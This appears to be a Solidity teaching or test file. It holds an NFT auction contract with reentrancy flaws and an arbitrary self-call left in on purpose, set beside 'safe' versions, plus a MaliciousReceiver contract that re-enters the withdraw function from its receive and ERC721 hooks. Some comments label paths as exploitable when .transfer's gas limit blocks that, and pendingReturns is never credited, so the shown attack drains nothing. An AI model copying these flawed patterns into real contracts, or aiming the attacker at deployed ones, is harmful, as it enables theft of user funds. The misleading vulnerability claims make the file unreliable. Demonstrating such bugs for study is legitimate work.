
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC721.sol";
import "./IERC1155.sol";

contract VulnerableNFTAuction {
    mapping(uint256 => address) public highestBidder;
    mapping(uint256 => uint256) public highestBid;
    mapping(address => uint256) public pendingReturns;
    
    IERC721 public nftContract;
    bool private locked;
    
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    constructor(address _nftContract) {
        nftContract = IERC721(_nftContract);
    }
    
    function bidWithNFT(uint256 tokenId, uint256 bidAmount) external payable {
        require(msg.value == bidAmount, "Value mismatch");
        require(bidAmount > highestBid[tokenId], "Bid too low");
        
        address previousBidder = highestBidder[tokenId];
        uint256 previousBid = highestBid[tokenId];
        
        // Update state AFTER external call - VULNERABLE!
        if (previousBidder != address(0)) {
            // External call before state update - reentrancy risk!
            payable(previousBidder).transfer(previousBid);
        }
        
        // State updated after external call
        highestBidder[tokenId] = msg.sender;
        highestBid[tokenId] = bidAmount;
    }
    
    function safeTransferNFT(address to, uint256 tokenId) external nonReentrant {
        require(msg.sender == highestBidder[tokenId], "Not winner");
        
        // Safe: state updated before external call
        address winner = highestBidder[tokenId];
        delete highestBidder[tokenId];
        delete highestBid[tokenId];
        
        // External call after state update - SAFE
        nftContract.safeTransferFrom(address(this), to, tokenId);
    }
    
    function vulnerableWithdraw() external {
        uint256 amount = pendingReturns[msg.sender];
        
        // External call before state update - VULNERABLE!
        payable(msg.sender).transfer(amount);
        
        // State update after external call
        pendingReturns[msg.sender] = 0;
    }
    
    function safeWithdraw() external nonReentrant {
        uint256 amount = pendingReturns[msg.sender];
        
        // State update before external call - SAFE
        pendingReturns[msg.sender] = 0;
        
        // External call after state update
        payable(msg.sender).transfer(amount);
    }
    
    // ERC721 receiver - potential reentrancy vector
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) 
        external returns (bytes4) {
        
        // This could be called during safeTransferFrom
        // and could potentially trigger reentrancy
        
        // Vulnerable: could call back to the contract
        if (data.length > 0) {
            (bool success,) = address(this).call(data);
            require(success, "Callback failed");
        }
        
        return this.onERC721Received.selector;
    }
    
    // ERC1155 batch transfer handling
    function handleBatchTransfer(address[] calldata recipients, uint256[] calldata tokenIds) external {
        require(recipients.length == tokenIds.length, "Array length mismatch");
        
        // Multiple external calls in loop - potential for reentrancy
        for (uint256 i = 0; i < recipients.length; i++) {
            // Critical state changes mixed with external calls
            address recipient = recipients[i];
            uint256 tokenId = tokenIds[i];
            
            // Update ownership
            highestBidder[tokenId] = recipient;
            
            // External call - could trigger reentrancy
            nftContract.safeTransferFrom(address(this), recipient, tokenId);
            
            // More state changes after external call - VULNERABLE!
            delete highestBid[tokenId];
        }
    }
}

contract MaliciousReceiver {
    VulnerableNFTAuction public auction;
    bool public attacking = false;
    
    constructor(address _auction) {
        auction = VulnerableNFTAuction(_auction);
    }
    
    function onERC721Received(address, address, uint256, bytes calldata) 
        external returns (bytes4) {
        
        if (!attacking) {
            attacking = true;
            // Reentrant call during NFT transfer
            auction.vulnerableWithdraw();
            attacking = false;
        }
        
        return this.onERC721Received.selector;
    }
    
    receive() external payable {
        if (!attacking) {
            attacking = true;
            // Reentrant call during ETH transfer
            auction.vulnerableWithdraw();
            attacking = false;
        }
    }
}
